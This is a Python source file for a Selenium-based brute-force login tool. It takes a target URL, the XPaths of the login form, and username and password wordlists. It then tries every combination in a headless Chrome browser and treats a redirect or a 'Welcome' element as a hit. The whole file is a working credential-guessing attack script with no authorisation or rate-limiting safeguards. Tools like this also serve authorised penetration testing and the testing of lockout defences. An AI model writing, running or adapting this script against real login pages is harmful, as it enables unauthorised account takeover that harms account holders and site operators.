from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import argparse
import time

parser = argparse.ArgumentParser(description="Brute-force login script.")
parser.add_argument("-u", dest="url", required=True, help="Target URL")
parser.add_argument("--uid", dest="username_xpath", required=True, help="XPath for username field")
parser.add_argument("--pid", dest="password_xpath", required=True, help="XPath for password field")
parser.add_argument("--sid", dest="submit_xpath", required=True, help="XPath for submit button")
parser.add_argument("--user", dest="username_file", required=True, help="Path to username file")
parser.add_argument("--pass", dest="password_file", required=True, help="Path to password file")
parser.add_argument("--change",dest="change",required=True,help="If 302 is detected after the login")
args = parser.parse_args()

url = args.url
username_xpath = args.username_xpath
password_xpath = args.password_xpath
submit_xpath = args.submit_xpath
username_file = args.username_file
password_file = args.password_file
change=args.change

# Function to attempt login with given credentials
def attempt_login(driver, username, password):
    driver.get(url)
    try:
        # Locate username and password fields and submit button
        username_input = WebDriverWait(driver, 0.2).until(
            EC.presence_of_element_located((By.XPATH, username_xpath))
        )
        password_input = WebDriverWait(driver, 0.2).until(
            EC.presence_of_element_located((By.XPATH, password_xpath))
        )
        submit_button = WebDriverWait(driver, 0.2).until(
            EC.element_to_be_clickable((By.XPATH, submit_xpath))
        )

        # Clear previous input
        username_input.clear()
        password_input.clear()

        # Enter credentials
        username_input.send_keys(username)
        password_input.send_keys(password)

        # Click submit button
        submit_button.click()

        # Wait for page load (adjust timeout as needed)
        time.sleep(0.75)

        current_url = driver.current_url

        if change.upper() == "Y":
        # Check for 302 redirect (if applicable)
            if driver.execute_script("return document.readyState;") == "complete" and current_url != url:
                print(f"Success! Username: {username}, Password: {password} (HTTP 302)")
                print("")
                return True

        # Check for successful login (example: check for specific element)
        try:
            success_element = WebDriverWait(driver, 0.5).until(
                EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Welcome')]"))
            )  # Replace with your success element XPath
            print(f"Success! Username: {username}, Password: {password}")
            print("")
            return True  # Indicate successful login
        except:
            print(f"Login failed with {username}:{password}")
            print("")
            return False

    except Exception as e:
        print(f"An error occurred during login: {e}")
        return False

# Load usernames from a text file
def load_usernames(filename):
    usernames = []
    with open(filename, 'r') as file:
        for line in file:
            usernames.append(line.strip())
    return usernames

# Load passwords from a text file (optional)
def load_passwords(filename):
    passwords = []
    with open(filename, 'r') as file:
        for line in file:
            passwords.append(line.strip())
    return passwords

# Set up the WebDriver
options = webdriver.ChromeOptions()
options.add_argument("--headless") # Run Chrome in headless mode (optional)
options.add_argument("--disable-popup-blocking")
options.add_argument("--disable-extensions")
options.add_argument("--log-level=2")
driver = webdriver.Chrome(options=options)  # Replace with your desired browser

# Load usernames
usernames = load_usernames(username_file) if username_file else []

# Load passwords (if provided)
passwords = load_passwords(password_file) if password_file else []

__check="n"
for username in usernames:
    for password in passwords:
        print(f'Trying username: {username}, password: {password}')
        if attempt_login(driver, username, password):
            print("Login successful. Exiting.")
            driver.quit()  # Quit the browser after successful login
            __check="y"
            break  # Break out of the password loop
    if __check=="y":
        break  # Break out of the username loop if successful login found

# Close the browser
driver.quit()